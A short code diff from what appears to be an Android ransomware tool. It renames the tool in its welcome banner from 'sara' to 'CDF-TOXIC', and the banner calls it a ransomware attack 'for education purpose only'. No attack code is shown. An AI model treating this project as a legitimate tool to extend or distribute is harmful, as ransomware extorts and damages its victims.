@@ -445,7 +445,7 @@ class __sara__:
         prints(f'''
 {sara} : Hi user, welcome to @{y}CDF-Toxic{w} :)
 
-{sara} : sara is a simple android ransomware attack
+{sara} : CDF-TOXIC is a simple android ransomware attack
          this tool is made for education purpose only
          the author is not responsible for any loses
          or damage caused by this programs.
